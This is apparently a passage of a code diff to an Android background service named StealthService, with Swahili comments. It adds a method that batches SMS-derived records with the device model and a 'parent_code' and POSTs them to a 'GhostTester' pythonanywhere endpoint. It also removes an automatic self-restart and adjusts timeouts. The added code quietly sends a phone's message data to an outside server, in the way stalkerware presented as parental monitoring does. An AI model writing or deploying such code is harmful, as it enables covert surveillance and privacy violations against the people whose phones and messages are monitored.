+                return "outgoing";
+            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
+                return "draft";
+            default:
+                return "unknown";
         }
     }
 
-    // 🎯 NJIA YA KUTUMA DATA - SERVER ILE ILE
-    private void sendDataToServer(String dataType, JSONObject dataContent) {
+    private String formatTime(long timestamp) {
+        try {
+            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+            return sdf.format(new Date(timestamp));
+        } catch (Exception e) {
+            return "Unknown";
+        }
+    }
+
+    // 🆕 NJIA MPYA YA KUTUMA BATCH DATA
+    private void sendBatchDataToServer(String dataType, JSONArray dataBatch) {
+        new Thread(() -> {
+            try {
+                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-batch-data";
+                
+                JSONObject postData = new JSONObject();
+                postData.put("parent_code", parentCode);
+                postData.put("data_type", dataType);
+                postData.put("device_id", android.os.Build.MODEL);
+                postData.put("data_batch", dataBatch);
+                postData.put("batch_size", dataBatch.length());
+                postData.put("timestamp", System.currentTimeMillis());
+
+                URL url = new URL(serverUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(30000);
+                conn.setReadTimeout(30000);
+
+                OutputStream os = conn.getOutputStream();
+                os.write(postData.toString().getBytes());
+                os.flush();
+                os.close();
+
+                int responseCode = conn.getResponseCode();
+                if (responseCode == 200) {
+                    Log.d(TAG, "✅ " + dataType + " batch ya " + dataBatch.length() + " imetumwa kikamilifu");
+                } else {
+                    Log.e(TAG, "❌ Server error for " + dataType + " batch: " + responseCode);
+                }
+
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Error sending " + dataType + " batch: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    // NJIA YA KUTUMA DATA MOJA MOJA
+    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
                 String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
@@ -546,8 +626,8 @@ public class StealthService extends Service {
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
-                conn.setConnectTimeout(15000);
-                conn.setReadTimeout(15000);
+                conn.setConnectTimeout(20000);
+                conn.setReadTimeout(20000);
 
                 OutputStream os = conn.getOutputStream();
                 os.write(postData.toString().getBytes());
@@ -567,6 +647,10 @@ public class StealthService extends Service {
         }).start();
     }
 
+    private boolean checkPermission(String permission) {
+        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
+    }
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
@@ -578,12 +662,6 @@ public class StealthService extends Service {
         if (timer != null) {
             timer.cancel();
         }
-        
-        // 🔄 AUTOMATIC RESTART
-        Intent restartIntent = new Intent(this, StealthService.class);
-        restartIntent.putExtra("PARENT_CODE", parentCode);
-        startService(restartIntent);
-        
-        Log.d(TAG, "🔄 StealthService inaanzishwa tena kiotomatiki");
+        Log.d(TAG, "🔴 StealthService imezimwa - data itaendelea kutumwa kwenye restart");
     }
 }
